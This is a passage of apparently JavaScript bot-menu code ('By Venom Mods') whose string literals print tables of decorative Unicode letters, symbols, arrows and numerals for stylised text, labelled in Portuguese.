\u2663 ̶̸̶̶̸̶๋๋Ṉ \u2663 ̶̸̶̶̸̶๋๋Ṏ \u2663 ̶̸̶̶̸̶๋๋Ṗ \u2663 ̶̸̶̶̸̶๋๋Q \u2663 ̶̸̶̶̸̶๋๋Ṝ \u2663 ̶̸̶̶̸̶๋๋Ṩ \u2663 ̶̸̶̶̸̶๋๋Ṭ \u2663 ̶̸̶̶̸̶๋๋Ṳ \u2663 ̶̸̶̶̸̶๋๋Ṿ \u2663̶̸̶̶̸̶๋๋Ẉ \u2663 ̶̸̶̶̸̶๋๋Ẍ \u2663 ̶̸̶̶̸̶๋๋Ỵ \u2663 ̶̸̶̶̸̶๋๋Ẑ\n\xA0*FONTE 21*\n๑̶๋ۣۜẶ\u2022 ๑̶๋ۣۜḆ\u2022 ๑̶๋ۣۜḈ\u2022 ๑̶๋ۣۜḊ\u2022 ๑̶๋ۣۜḜ\u2022 ๑̶๋ۣۜḞ\u2022 ๑̶๋ۣۜḠ\u2022 ๑̶๋ۣۜḦ\u2022 ๑̶๋ۣۜḮ\u2022 ๑̶๋ۣۜĴ\u2022 ๑̶๋ۣۜḲ\u2022 ๑̶๋ۣۜḺ\u2022 ๑̶๋ۣۜṂ\u2022 ๑̶๋ۣۜṈ\u2022 ๑̶๋ۣۜṎ\u2022 ๑̶๋ۣۜṖ\u2022 ๑̶๋ۣۜQ\u2022 ๑̶๋ۣۜṜ\u2022 ๑̶๋ۣۜṨ\u2022 ๑̶๋ۣۜṬ\u2022 ๑̶๋ۣۜṲ\u2022 ๑̶๋ۣۜṾ\u2022 ๑̶๋ۣۜẈ\u2022 ๑̶๋ۣۜẌ\u2022 ๑̶๋ۣۜỴ\u2022 ๑̶๋ۣۜẐ\u2022\n\xA0*Fonte 22*\n\u2663̶̸̶̶̸̶๋๋Ḁ \u2665 ̶̸̶̶̸̶๋๋Ḇ \u2663 ̶̸̶̶̸̶๋๋Ḉ \u2663 ̶̸̶̶̸̶๋๋Ḋ \u2663 ̶̸̶̶̸̶๋๋Ḝ \u2663 ̶̸̶̶̸̶๋๋Ḟ \u2663 ̶̸̶̶̸̶๋๋Ḡ \u2663 ̶̸̶̶̸̶๋๋Ḧ \u2663 ̶̸̶̶̸̶๋๋Ḯ \u2663 ̶̸̶̶̸̶๋๋Ĵ \u2663 ̶̸̶̶̸̶๋๋Ḳ \u2663 ̶̸̶̶̸̶๋๋Ḻ \u2663 ̶̸̶̶̸̶๋๋Ṃ \u2663 ̶̸̶̶̸̶๋๋Ṉ \u2663 ̶̸̶̶̸̶๋๋Ṏ \u2663 ̶̸̶̶̸̶๋๋Ṗ \u2663 ̶̸̶̶̸̶๋๋Q \u2663 ̶̸̶̶̸̶๋๋Ṝ \u2663 ̶̸̶̶̸̶๋๋Ṩ \u2663 ̶̸̶̶̸̶๋๋Ṭ \u2663 ̶̸̶̶̸̶๋๋Ṳ \u2663 ̶̸̶̶̸̶๋๋Ṿ \u2663 ̶̸̶̶̸̶๋๋Ẉ \u2663̶̸̶̶̸̶๋๋Ẍ \u2663 ̶̸̶̶̸̶๋๋Ỵ \u2663 ̶̸̶̶̸̶๋๋Ẑ\n\xA0*Fonte 23*\n\u2665̶̸̶̶̸̶๋๋Ḁ\u2663 \u2665 ̶̸̶̶̸̶๋๋Ḇ\u2663 \u2665 ̶̸̶̶̸̶๋๋Ḉ\u2663 \u2665 ̶̸̶̶̸̶๋๋Ḋ\u2663 \u2665 ̶̸̶̶̸̶๋๋Ḝ\u2663 \u2665 ̶̸̶̶̸̶๋๋Ḟ\u2663 \u2665 ̶̸̶̶̸̶๋๋Ḡ\u2663 \u2665 ̶̸̶̶̸̶๋๋Ḧ\u2663 \u2665 ̶̸̶̶̸̶๋๋Ḯ\u2663 \u2665 ̶̸̶̶̸̶๋๋Ĵ\u2663 \u2665 ̶̸̶̶̸̶๋๋Ḳ\u2663 \u2665 ̶̸̶̶̸̶๋๋Ḻ\u2663 \u2665 ̶̸̶̶̸̶๋๋Ṃ\u2663 \u2665 ̶̸̶̶̸̶๋๋Ṉ\u2663 \u2665 ̶̸̶̶̸̶๋๋Ṏ\u2663 \u2665 ̶̸̶̶̸̶๋๋Ṗ\u2663 \u2665 ̶̸̶̶̸̶๋๋Q\u2663 \u2665 ̶̸̶̶̸̶๋๋Ṝ\u2663 \u2665 ̶̸̶̶̸̶๋๋Ṩ\u2663 \u2665 ̶̸̶̶̸̶๋๋Ṭ\u2663 \u2665 ̶̸̶̶̸̶๋๋Ṳ\u2663 \u2665 ̶̸̶̶̸̶๋๋Ṿ\u2663 \u2665 ̶̸̶̶̸̶๋๋Ẉ\u2663 \u2665̶̸̶̶̸̶๋๋Ẍ\u2663 \u2665 ̶̸̶̶̸̶๋๋Ỵ\u2663 \u2665 ̶̸̶̶̸̶๋๋Ẑ\u2663\n*Fonte 24\n̶̸̶̶̸̶๋๋Ḁ ̶̸̶̶̸̶๋๋Ḇ ̶̸̶̶̸̶๋๋Ḉ ̶̸̶̶̸̶๋๋Ḋ ̶̸̶̶̸̶๋๋Ḝ ̶̸̶̶̸̶๋๋Ḟ ̶̸̶̶̸̶๋๋Ḡ ̶̸̶̶̸̶๋๋Ḧ ̶̸̶̶̸̶๋๋Ḯ ̶̸̶̶̸̶๋๋Ĵ ̶̸̶̶̸̶๋๋Ḳ ̶̸̶̶̸̶๋๋Ḻ ̶̸̶̶̸̶๋๋Ṃ ̶̸̶̶̸̶๋๋Ṉ ̶̸̶̶̸̶๋๋Ṏ ̶̸̶̶̸̶๋๋Ṗ ̶̸̶̶̸̶๋๋Q ̶̸̶̶̸̶๋๋Ṝ ̶̸̶̶̸̶๋๋Ṩ ̶̸̶̶̸̶๋๋Ṭ ̶̸̶̶̸̶๋๋Ṳ ̶̸̶̶̸̶๋๋Ṿ ̶̸̶̶̸̶๋๋Ẉ ̶̸̶̶̸̶๋๋Ẍ ̶̸̶̶̸̶๋๋Ỵ ̶̸̶̶̸̶๋๋Ẑ\nஜ\u06E9\u06DE\u06E9ஜஜ\u06E9\u06DE\u06E9ஜஜ\u06E9\u06DE\u06E9ஜஜ\u06E9\u06DE\u06E9ஜ\nA=Δ\uA670 Λ λ Ⱥ \u20B3@ ą å ส สั ล α ค ศ Ⴉ \uD83C\uDDE6 \uD83C\uDDE6ศ \u20B3 ﾑΔ a ɑ Ă 厾 λ α Λ ɐ ส丹\u24D0 Д \u2206 ਸ λ Λ ą å ส ล ค α Ą ਜ Ẵ ศ ά āλ Д Å ä ล Ẳ Ħ ª ẩ ส Ä ձ Ą ๖ۣۜĄ αสั ά ặ\nम स 禸 丒丸凡 丹入 ﾑ ム Д 开 ໞ Ѧ 月么 ਜ A\u0489 岚 ๖ۣۜA ꬍꬅ 刄 㞩\nৢۜ͜͡ \u271Fℳ\xA5ֆ\u20AE\u1364\u20A1ৎ\u271E̤֟\u066D\nB=多 乃 ঔৣ͜͡岌 в \u0E3F ß β ც\u24D1 ხ ɮ β ß \u0E3F Ъ طß в β ხ \u0E3F в \u2422 ๒ Ъ ъ ь Ɓ ß \u0E3F Þ 乃 邦 ぶ \u2707 及 в Ⴊ \uD83C\uDDE7 ๖ۣۜB 夃 ଷゐßѢƀЪЬβϐбБъьわゎらね \u266D ɓ B\u0489 ㄢ\xA0\n\nC=\xA2 \u20A1 \u20A2 C ς \u2282 匚 ㄷ ど に 二仁 \uD83C\uDDE8 ɕ ૮ C\u0489 ๖ۣۜC Շ \uD83C\uDDE8 \xA2 \u20A1 ᄃ c̈̈ ɔ ς \xA9C\xA2 ς \xA9 ζ Ƈ Ɔ ʗ \u20A1 ૮ ح\xA2 Ĉ č Č \xA9 ĉ Ć ૮\n\nD=ↁ Đ ɗ đ δ ɖ わ 力 \u2283̸ \u2285໓ \uD83C\uDDE9 \u220C D\u0489 刀 Ɗ\n๖ۣۜD ಖ \uD83C\uDDE9đ Đ ɖ \u24D3 \u2202 ժÐ \u2202 đ ۜÐ \u20ABÐ \u2202 ð đ ๔ მ ძ ժ ɗ\n\nE=Ɇ \u20AC \u212E \u326B \u2209 \u2208 Ξ Σ ξ Є ๋Є ع ə ɇ є ჲ をﾐ ﾓ 三 巨 玄乞 Ｅ它 ೯ ౯ ㄠ モ \uD83C\uDDEA E\u0489 亥 ૯ ๖ۣۜE も ƎƏ Ɛ \u060F៩ \uD83C\uDDEA 乇 Є є Σ ε ξ \u24D4 玄 ៩ \u20A4 ჰ პ\u212E\xA3 Є ξ Є๋ є ჱ ŧ Σ ε ع э έ נּ גּ ɛ ə ٤ ૯૯ є პ ε Ë ع ﻊ ē \u20AC ξ έ \u212E ë Э ۼ\n\nF=Ғ ƒ Բ下 ﾁ Ϝ Fヂ Ք F 下 \uD83C\uDDEB F\u0489. ๖ۣۜF \uD83C\uDDEB ｷ \u20A3 ʃ ғ \u24D5 f Ғƒ Բ ๖ۣۜF \u20A3ƒ \u20A3 ﬄ ךּ דּ Ғ ક\n\nG=\u20B2 ǥ Ⴚ Ǥ \u2761 ሬ \uD83C\uDDEC Ԍ G\u0489 ๖ۣۜG ໔ ໕ ផ \u0BF9\uD83C\uDDEC Ĝ Ģ g G̈̈ \u24D6 \u20B2 \u0BF9 ğ G๋ ๔ Ġ ġ ģ ğ๋ ؤ و פĢ \u20A2 ɠ ૬ ǥ\n\nH=Ħ ん ɧ 卄௮ அ ஆ Һ һ н Ҕ ҕ Ң ң Ҥҥ Ӈ ӈ Ԋ ԋ 艹 Ⴌ \uD83C\uDDED \u2560\u2563 H み ђ ๖ۣۜH ਮ \uD83C\uDDED ん ħ н ђ அ ჩ ħ \u2560\u2563 ђ સ Њ ௮ Ћ нસ அ ħ ђ н Ћ Њ अ\u2560\u2563\n\nI=\u1364 ɨ \u17DB í \u2223 ழェ エ ｪ ｴ 工讠 辶 เ ቾ \uD83C\uDDEE \u0489 I\u0489 ๖ۣۜI ⶇⷀ \uD83C\uDDEE ί Ξ រ ł ιΐ ι \u2551ï Î เ Ī ﭑ Ỉ î Į ĩϊ ΐ ذ ﻐ ɩ ւ ɨ\n\nJ=ʝĲ ｊ Ｊ ʲქ ჟ \uD83C\uDDEF J ℑ ๖ۣۜJ \uD83C\uDDEFʝ ქ J Ĵ ɾ ე უل נ ਹ Ĵנ ل Ţ ړ ਹ ﻮ ʝ ჟ\n\nK=Ҝ Ҟ Ӄ \u20AD Ҝ 长 ҟ Ҡ ҡ ӄ ҝ \uD83C\uDDF0 Ƙ K ઝ ๖ۣۜK\uD83C\uDDF0 \u20AD Ҝ κ ķ К к ๖ۣۜK ઝ Қ ķ к Ҝ \u20AD К қ ҝ\n\nL=Ł Լ ℓ \u221F ﾚ し ̽ſ ʆ ไ \u20B0 \uD83C\uDDF1よ๊レ 廴 L\u0489 ㄥ ๖ۣۜL โ Ն \u20BA \uD83C\uDDF1 Ł \u20B0 ℓ Լ よ ℓ Ĺ Ł Լ Ľ Ļ Ŀ \u2518\xA3 ไŁ ℓ Ļ ๋\u255DԼ\n\nM=ℳ ℳ๓ ற м რ ო ɱ \u20A5 Ӎ ポ ボ /V 水 ണ Ӎ \uD83C\uDDF2 M\u0489 爪 ๖ۣۜM\uD83C\uDDF2 м ℳ რ ற ო ɱ ๓ ʍ დლм ற /V ๓ ๖ۣۜM Щ๓ ற м \u20A5 რ ო ɱ\n\nN=\u20A6 Ń ņ ரŋИ ภй מ Ň หฑ иη\u2229 ல \u20AA ൯ Ŋ N\u0489 れ ๖ۣۜN ฌ ญ ൮ വശഷസ Л\uD83C\uDDF3и \u20A6 Π \u20AA η ெ வ йи η ŋ ฑ ர И ภ й Ń ņ ή п ห Ŋ ภ Պ ฑ η и ர Ɲ ห \u20AA ɳ מּ תּ \u20A6\n\nO=Ѻ θ Θ \u274D \u25EF 〇Ծ\u0489 ゆ \u2205 Ø Ծ Օ ס \u2297 \u20B4 Θ ΦϕФ Ω θ๑ \u0E4F ο ๐ σ ø ѳ Ѻ Ѳ Ө ०の \uD83C\uDDF4 \u06DD O 口 ๖ۣۜO 汩 ଠ \uD83C\uDDF4Ø\u0E4Fσǿ\u2295ƠФץםץ\u20B4ΘԾøΩ\u274Dტიბθ\u2742 ø σ Ø ૭ Ǿ ö \u2642 ợ Ů Ơ Ō Ծ Θ δ Ǿ Ф Ộ Ö ǿ Ŏ ό Ø ѳ ø ૭ σ \u0E4F ơ Θ Ф ठ \u263B\u263A θ Ө ɵҨ\n\nP=\u2118 \u20B1 了 ァ户 ㄕ尸 卩卫 ƿ ρ م թ ｱ ק \xB6 や ゃ ア マ ャ ヤ ヹ \uD83C\uDDF5 伊 \u0489 P\u0489 ㄗ ๖ۣۜP 尹 \uD83C\uDDF5ρ ק թ þ φÞ \u2560\u255Dקּ թ φ þ քק Þ ρ P๋ \u203D ρ ƿ ք թ ॐ\xA0\n\nQ=φ Ҩ ҩ. \uD83C\uDDF6 ϑ Q\u0489 ๖ۣۜQ\uD83C\uDDF6q ๖ۣۜQǪ ǫ գ\n\nR=ℜ Ԅ रै\u20B9Я 訳 尺 㞍尻尺 尼 尽 Ի ʀ ɾ я Я 民 \uD83C\uDDF7 R\u0489 屁 ૨ ๖ۣۜR ฯ ণ 尺 尻 я ℜ Γ я \xAE л Я Ř ř ર ŗ ѓ ל гг ŗ я \xAE Я Ŗ\nৢۜ͜͡ \u271Fℳ\xA5ֆ\u20AE\u1364\u20A1ৎ\u271E̤֟\u066D\nS=\xA0ฐ ร ຮ ธ ऽ \u20B7 ֆ ى ک উ ঊ Տ હ ៜ \uD83C\uDDF8 ട乌马 写 ㄅ ㄘㄎ 亐令 S\u0489 Ｓ ๖ۣۜS ঙ ຣ ଌ \uD83C\uDDF8ঊ \u20B7 ន ѕ ร \u20B4 ஜى \xA7 ร ş ئ ટ ک Ŝ š હ Ş ઽ ՏȘ ร ﻜ \xA7 Ş ֆ હ $ Ș Ƨ ى ş Տ ડ ઽ ૐ\xA0\n\nT=\u2533 \u3012 Ԏ Ŧ \u20AE \u09F3 ॠ ŧ ჭ \u22A5 匕十 क़ 丁 も デ テ ナ ㄤ ｲ 亻 ট ゼ Ⴀ \uD83C\uDDF9平 亇 T\u0489 す ๖ۣۜT ক ፐ ፓ 弋 字 \uD83C\uDDF9т \u2020 է Ե ｲ Ŧ \u09F3ჯ \u20AE क も ł \u253C \u2020 т Ŧ Ţ Ť ŧ \u3036\u3012ł Ŧ \u2670 Ƭ τ \u2020\xA0\n\nU=น Ü บ ป ย ษ ข μ い ų น บ ป\u222A リ ㄩ凵びひ სυʉ \uD83C\uDDFA Ҵ ચ થ ს U\u0489 む ષ ๖ۣۜU Ⴎ ษ \uD83C\uDDFA ひ υ ს \u222Aચ µ Ü ü џ ů ย Û û ŭ ن น ષย џ ચ Ǔ Џ Ц Ū ப ʉ μ થ ય મ և υ ц\n\nV=\u221A 讠 \uD83C\uDDFB V\u0489 \u2228 ๖ۣۜV ง \uD83C\uDDFBν\u2207\u221A ૪\u221A ٧ ს\n\nW=\xA0\u20A9 ฬ ผ ฝ พ ฟ \u0BF0 ឃ ω \uD83C\uDDFC W\u0489 ખ 山 ๖ۣۜW ຟ \uD83C\uDDFC Ѡ Ш \u20A9 ωŴ ω ŵ ખ ώ ฬ ฝ พ ฟ ﷲ ਘ\n\nX =\xD7 区\xD7义冈区囟ҳ̸Ҳ̸ҳ\u2718\u2717 χ \uD83C\uDDFD 乂 X\u0489. メ ๖ۣۜX \uD83C\uDDFDχ Ҳ ҳ \u2716χ Ж ჯ \xD7א ﭏ Ҳ ҳ χ \xD7\n\nY =\xA0ƴ \xA5 丫吖 Ɏ Ύ Ⴘ 쏘 γ צ ყ Ⴘ Ⴗ ע γ у Y ﻻ ㄚ Ⴤ \uD83C\uDDFE ψ Ψ Y\u0489. ๖ۣۜY \u2F2C Ƴ\uD83C\uDDFEу Ψ ყ γμ\xA5 ﻻ ŷ Ў ყ γ ÿ ý ५У ყ ﻻ צּ Ұ \xA5 У ұ ץ\n\nΖั =\xA0ʑ Ӡ ӡ ろ る 乙 之 z ƶ ȥ ʒ ʐ ʑ ƺ ʓ \uD83C\uDDFF Z\u0489 \uD83C\uDDFF z 乙 ζ Հ Ż ž ζ ż Ƶ Հ ƶ ƺ\nஜ\u06E9\u06DE\u06E9ஜஜ\u06E9\u06DE\u06E9ஜஜ\u06E9\u06DE\u06E9ஜஜ\u06E9\u06DE\u06E9ஜ\n*Caracteres Especiais*\n\u06DD \u06DE \u06E9 ̸̸͢ ̸̸\u06E9ۣۣۣۣۣۣ۠۠۠ۜ۠۠ۤۜۜ۠Seu Nome̸̸\u06E9ۣۣۣۣۣۣ۠۠۠ۜ۠۠ۤۜۜ۠\xA0 \u0BF5 \u0BF8 \u0BF9 ఈ ඤ ඹ ෂ \u0DF4 ᅘ\u2023 \u2031 \u203B \u203D \u2042 \u204B \u205C \u2050 \u2051 \u208D\u208E \u207D\u207E \u20DD ↂ \u2189 \u22A0 \u2318 \u2591 \u2592 \u2593\nஜ\u06E9\u06DE\u06E9ஜஜ\u06E9\u06DE\u06E9ஜஜ\u06E9\u06DE\u06E9ஜஜ\u06E9\u06DE\u06E9ஜ\n*Xadrez*\n\u265F \u265E \u265D \u265C \u265B \u265A \u2659 \u2658 \u2657 \u2656 \u2655 \u2654\nஜ\u06E9\u06DE\u06E9ஜஜ\u06E9\u06DE\u06E9ஜஜ\u06E9\u06DE\u06E9ஜஜ\u06E9\u06DE\u06E9ஜ\n*Extras*\n\u2693 \u2691 \u2690 \u268F \u268E \u2689 \u2688 \u2687 \u267E \u267D \u267C \u267B \n\u267A \u2679 \u2678 \u2677 \u2676 \u2675 \u2674 \u2673 \u2672 \u2671 \u2670 \u266F\u266E\u266D\u266C \u266B\u266A\u2669\u2668\u2667\u2665\u2664\u2662\u2661\u2647\u2646\u2645\u2644\u2643\u2642\u2641\u2640\u263F\u2646\u263D\u263E\u263C\u263B\u2639\u2638\u2636\u262F\u262E\u262D\u262C\u262B\u262A\u2629\u2628\u2620\u2621\u2622\u2623 \u2624\u2625\u2626\u2627\u261F\u261E\u261D\u261C\u261B\u261A\u2619\u2618\u2617\u2616\u2613\u2612\u2610\u2608\u2609\u260A\u260B\u260C\u260D\u2607\u2606\u2604\u2603\nஜ\u06E9\u06DE\u06E9ஜஜ\u06E9\u06DE\u06E9ஜஜ\u06E9\u06DE\u06E9ஜஜ\u06E9\u06DE\u06E9ஜ\n*SETAS*\n\u21FF\u21FE\u21FD\u21FC\u21FB\u21FA\u21F9\u21F8\u21F0\u21F1\u21F2\u21F3\u21F4\u21F5\u21F6\u21F7\u21F7\u21EE\u21ED\u21EC\u21EB\u21EA\u21E9\u21E8\u21E7\u21E6\u21E5\u21E4\u21E3\u21E2\u21E1\u21E0\u21D8\u21D9\u21DA\u21DB\u21DC\u21DD\u21DE\u21DF\u21D7\u21D6\u21D5\u21D4\u21D3\u21D2\u21D1\u21D0\u21C8\u21C9\u21CA\u21CB\u21CC\u21CD\u21D6\u21C7\u21C6\u21C5\u21C4\u21B8\u21B9\u21BA\u21BB\u21BC\u21BE\u21BF\u21B7\u21B6\u21B5\u21B4\u21B3\u21B2\u21B1\u21B0\u21A8\u21AB\u21AC\u21AD\u21AE\u21AF\u21AF\u21A6\u21A5\u21A4\u21A3\u21A2\u21A1\u21A0\u219F\u219E\u219D\u219C\u219B\u219A\u2193\u2192\u2191\u2190ↆ\nஜ\u06E9\u06DE\u06E9ஜஜ\u06E9\u06DE\u06E9ஜஜ\u06E9\u06DE\u06E9ஜஜ\u06E9\u06DE\u06E9ஜ\n*Simbolos Árabes*\nⷡⷢⷡⷡ\uFDFD\uFDFCﷻﷺﷇﷆﶫﶪﵝﵜﳐ\nஜ\u06E9\u06DE\u06E9ஜஜ\u06E9\u06DE\u06E9ஜஜ\u06E9\u06DE\u06E9ஜஜ\u06E9\u06DE\u06E9ஜ\n*Numerais*\nৢۜ͜͡ \u271Fℳ\xA5ֆ\u20AE\u1364\u20A1ৎ\u271E̤֟\u066D\n# \u20E3 \u266F\xA0\xA0 #\xA0 1\n0\xA0 \u20E3\u2080 \u2070 口の \u2B55 \u3264 \u3267 \u2205\n1\xA0\xA0\u20E3\u2081\xB9 \u2776 \u2460\xA0\xA0\n2\xA0 \u20E3 \u2082 \xB2ᆯ உ Զ ƻ Ձ \u2777 \u2461 \u3263\n3\xA0\xA0\u20E3 \u2083 \xB3 ჳ ƺ ʓ Ȝ ѯ る ਤ ℨ ㄋ \u2778 \u2462\n4\xA0\xA0\u20E3 \u2084 \u2074 ५ Վ ﾑ ч ҷ ӌ ҹ \u2779 \u2463\xA0\n5\xA0 \u20E3 \u2085 \u2075 Ƽ ら ち \u277A \u2464\n6\xA0 \u20E3 \u2086 \u2076 \u277B\u2465\xA0\n7\xA0\xA0\u20E3 \u2087 \u2077 ᆨ \u277C \u2466\xA0\n8\xA0 \u20E3 \u2088 \u2078 Ց \u277D \u2467\xA0\n9\xA0\xA0\u20E3 \u2089 \u2079 Գ ອ \u277E \u2468\nஜ\u06E9\u06DE\u06E9ஜஜ\u06E9\u06DE\u06E9ஜஜ\u06E9\u06DE\u06E9ஜஜ\u06E9\u06DE\u06E9ஜ\n*Mais Simbolos*\n\u2662\u2662\u2663\u2664\u2666\u2668\u2680\u2682\u2683\u2685\u2767\u2765\u2765\u2764\u2760\u2760\u2751\u2752\u2741\u2743\u2745\u2754\u2754\u2756\u2746\u2747\u2748\u2759\u2759\u274B\u275C\u275D\u275E\u274F\u274E\u274D\u274C\u274A\u274A\u2749\u2748\u2747\u2745\u2744\u2742\u2740\u2740\u2730\u2731\u2733\u2733\u2734\u2735\u2737\u2737\u2738\u2739\u273A\u2671\u273B\u273C\u273D\u273F\u272F\u272E\u272B\u272B\u272A\u2727\u2726\u2725\u2724\u2724\u2723\u2722\u2721\u2721\u2720\u271F\u271E\u271C\u271B\u271A\u2719\u2718\u2718\n\nBy Venom Mods\n\n',
          'pink'
        )
      ),
        await sleep(6000),
        main()
      break
    case 'tabela3':
      console.clear(),
        console.log(
          color(
            '\n\n就 像 模 像 ા િ ી ુ ૂ ૃ ૄ ૅ ે ૈ ૉ \u20A1 \u20A2 \u20A4 \u20A5 \u20A6 \u20A9 \u20AA \u20AB \u20AD \u20AF \u20BE \u20BD \u20BB \u20BA \u20B8 \u20B7 \u20B6 \u20B6 \u20B5\u20B4 \u20B2 \u20B0\u20B1 \u20B3 \u2E3F \u2E1A \u2E1B ⶬ \u2EDE\u2E19ㆃ㑹䡤 \u2592\u2591\u2593 \u0489 \u0488 ℳ ℴ ℵ \u2125ℤ ℨ \u2118 ℜ ⅈ Δ\n\u2654 \u2655 \u2656 \u2657 \u2658 \u265A \u265D \u265F \u2662 \u2664 \xA0\xA0̸\u2765 \u25C6 \u2588 \u25E3 \u25E2 \u25E5 \u0488 \xA0\u0489 \u0489\u0489\u0489\u0489\u0489\u0489\u0489\u0489 \n\u2588\u2587\u2586\u2585\u2584\u2583\u2582\u2581\n\u2580\u2581\u2582\u2583\u2584\u2585\u2586\u2587\u2588\u2589\u258A\u258B\u258C\u258D\u258E\u258F\n\u25AE\u25AF\u25B0\u25B1\u25B2\u25B3\u25B4\u25B5\u25B6\u25B7 \u25B8\u25B9\u25BA\u25BB\u25BC\u25BD\u25BE\u25BF\u25C0\u25C1 \u25C2\u25C3\u25C4\u25C5\u25C6\u25C7\u25C8\u25C9\u25CA\u25CB \u25CC\u25CD\u25CE\u25CF\u25D0\u25D1\u25D2\u25D3\u25D4\u25D5 \n\u25D6\u25D7\u25D8\u25D9\u25E2\u25E3\u25E4\u25E5\u25E6\u25E7 \u25E8\u25E9\u25EA\u25EB\u25EC\u25ED\u25EE\u25EF\n\u25B2\u25BC \u25C6\n\u2760 \u275E \u2751 \u2752 \u2741 \u2743 \u2745\u2756\u2746\u2748 \u2759\u2759\u25AC\u25AD \u274B\u275C\u275D\u275E\u274F\u274D\u274A\u274A\u2749\u2748\u2745\u272B\u272A\u2727\u2726\u2725\u2724\u2724\u2723\u2722 \u21DDۜ\u21DC\u1B7C\u2E3C\u271E\u2E3C\u1B7C \u2E0E \u2022เั \u2E0E ೈ፝͜͡\u2742 \u21AD \u271F \u2717\u2719 \u271A \u271B \u2720 \u271F \u271E \u271C \u2722 \u2727 \u2726 \u272E \u272D \u272C \u2729 \u272F ۣۜ \u272B \u272A \u2729 \u273A \u2739 \u2738 \u2737 \u2742 \u2767 \u2766 ۜ\u272F ۣۜৡ \uA9C1 \uA9C2\u1B7C \u271E \u2E3C\u1B7C เั\u2022 \u06DE \uD81A\uDD0D \uD81A\uDDB4 \uD81A\uDCC1 \u0F12 \uD81A\uDCD8 \uD81A\uDDC3 \uD81A\uDD5F \uD81A\uDCE7 \uD81A\uDCC6 \uD81A\uDD42 \uD81A\uDC06 \uD81A\uDC26 \uFFFD ဩ \u2332 \uAADE \uD81A\uDC07 \uD81A\uDC03 \uD81A\uDC0C \uD81A\uDC0D \uD81A\uDC0F \uD81A\uDC0E \uD81A\uDC1C \uD81A\uDC1D \uD81A\uDC1E \uD81A\uDC1F \uD81A\uDC25 \uD81A\uDC27 \uD81A\uDC23 \uD81A\uDC22 \uD81A\uDC21 \uD81A\uDC20 \uD81A\uDC28 \uD81A\uDC29 \uD81A\uDC2A \uD81A\uDC2B \uD81A\uDC2C \uD81A\uDC2D \uD81A\uDC2E \uD81A\uDC2F \uD81A\uDC32 \uD81A\uDC33 \uD81A\uDC34 \uD81A\uDC35 \uD81A\uDC36 \uD81A\uDC37 \uD81A\uDC30 \uD81A\uDC00 \uD81A\uDC79 \uD81A\uDC78 \uD81A\uDC80 \uD81A\uDC81 \uD81A\uDC82 \uD81A\uDC83 \uD81A\uDC84 \uD81A\uDC87 \uD81A\uDC7F \uD81A\uDC7E \uD81A\uDC7D \uD81A\uDC7C \uD81A\uDC7B \uD81A\uDC77 \uD81A\uDC76 \uD81A\uDC74 \uD81A\uDC73 \uD81A\uDC72 \uD81A\uDC71 \uD81A\uDC70 \uD81A\uDC8B \uD81A\uDC9A \uD81A\uDC98\uD81A\uDCA0 \uD81A\uDC94 \uD81A\uDC96 \uD81A\uDC9D \uD81A\uDCAB \uD81A\uDCD0 \uD81A\uDCD4 \uD81A\uDCD5 \uD81A\uDCD6 \uD81A\uDCD7 \uD81A\uDCE5 \uD81A\uDCE6 \uD81A\uDCE7 \uD81A\uDCF2 \uD81A\uDCF1 \uD81A\uDD3C \uD81A\uDDEE \uD81A\uDDBA \uD81A\uDDB2 \uD81A\uDD76 \u0FC7 卐\n๖ۣۜ͡ஓீ͜͜͡\u2765 ঔৣ͜͡ீ͜\u2765͜ ू ፝͜\u2765 \xA0\xA0ৎ\u2765̤֟\u066Dۣۜ \u2726ۣۜۜ\u2606ۣۜۜ͜͡ ঔৣֳ᷌᷈͜͡\u2740 ৎ\u273F̤֟\u066D \u2726\u0488͜͡\u27B3ঔৣ͜͡\u27B3 ๖ۣۜ͡ஓீ͜͡ ஓீ͜͡ ஓீ፝͜͡ \xA0ஓீ͜ ్మాై ೈ፝͜͡๖ۣۜ ೈ፝ ீ͜ৡৢ͜͡ ๖ۣۜۜ͜͡ீ͜ ঔৣ͜͡ ৢۜ͜͡\u271B\n\u2588 \u2589 \u258A\u258B\u258C\u258D\u258E\u258F\u2591 \u2592 \u2593\n\u25A1\u25A2\u25A3\u25A4\u25A5\u25A6\u25A7\u25A8\u25A9\u262D\u200B\n\u2363 \u2364 \u235F \u2318 \u262A \u2704 \u270E \u2710 \u2711 \u2717 \u2713 \u2701 \u2703 \u2719 \u271A \u271B \u27C1 \u27E1\u2E19 〯 \u20DD 〮 \u2388 \u0DF4 ැ \u271C \u271D \u271E \u271F \u2720 \u2722 \u2723 \u2724 \u2725 \u2726 \u2727 \u2729 \u272A \u272B \u272C \u272D \u272E \u272F \u2730 \u2731 \u2732 \xA0\u2735 \u2736 \u2737 \u2738 \u2739 \u273A \u273B \u273C \u273D \u273E \u273F \u2740 \u2741 \u2742 \u2743 \u2745 \u2746 \u2741\u2749 \u274A \u274B \u274D \u274F \u2750 \u2751 \u2752 \u2756 \u2765 \u2766 \u2767 \u2762 \u275D \u275E\u2760 \u275F ෑ ී \u0E5B ຂ \u0F06 \u0F07 \u0F05 \u25D9 \u25D8 \u0F04 \u0F12 \u0F17 ༾ \u0F3A \u0F3B \u0F3C \xA0\xA0\u0F3D ༿ ཱོ ྌ ཽ \u0FC7 \u0FC5 \u0FC8 \u0FCA \u0FCB \u0FCC \u0FD3 \u0FD9 \u0FDA \u0FD4 \u0FD2 ် ဵ ့ ღ \u10FB ᕖ ំ ᩧ ᩙ ᩘ ᩬ ᩴ \u1AA3 \u1AA5 ᪘ ᪱ ᬵ \u1CC0 \u22B0 \u22B1 \u22B6 \u22B7 \u22C6 \u25C8 \u25C9 \u25CE \u25CC \u25C7 \u266A ೀ ು ೂ ೃ \u1BFC ೄ \xA0ೆ ೇ ़ൣ় ి ೈ ೊ ೋ ್ ೌ ೕ ೖ ೢ ೣ െ ൂ ൢ ൣ \u17DA \u1BFC ୢ ୭ ᭄ ᬄ : ஜ \u2FFB \u06DE ଃ \u2055 ː ூ ை ઼ \u06DD ૂ ુ \u25CC᪱ \u1AA4 ீ۪۪۫۫ \u2FF3 \u2FF4 〢\u0FC2 \u0FC3 \u0FC4 \u2740ཱི \xA0\xA0\xA0\xA0\xA0ཱིୢ \u0F0A \u0FCF \u0FDA \u2055 ᬉ ː \u2E19 \u25D0 \u25B7\u25B3\u25BD \u2260 \u2248 \u222B \u25D5\uFE43\uFE44ɤ ɣ \u17DB \u2725 \u20A0 ʆ \u0E4F \u221E \uFE42 з ε ๑ \u235F \u2021 ᴥ \u0F17ຼ \u25CA \u2252 \u2A23 \u2E3D \u1392 